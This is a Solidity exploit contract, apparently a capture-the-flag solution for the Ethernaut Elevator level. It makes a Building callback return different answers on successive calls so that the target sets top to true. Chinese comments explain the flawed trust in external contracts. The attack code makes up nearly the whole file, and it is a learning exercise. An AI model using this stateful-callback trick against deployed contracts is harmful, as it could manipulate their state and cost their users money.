// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Building , Elevator } from  "./Elevator.sol";

contract ElevatorAttack is Building {
    bool private called = false;
    Elevator private elevator;
    
    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }
    
    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false;  // 第一次调用返回 false，通过 if 条件
        } else {
            return true;   // 第二次调用返回 true，设置 top = true
        }
    }
    
    function attack() external {
        elevator.goTo(10);
    }
}

//这个漏洞的本质上是对外部合约行为的错误假设,开发者假设islastfloor是一个pure函数,但是在ev层面,任何不带view/pure的外部调用都可以修改状态,导致前后返回不一样的结果.
// 这体现了智能合约开发者中一个重要的原则,永远不要信任外部合约的行为,除非有明确的约束机制.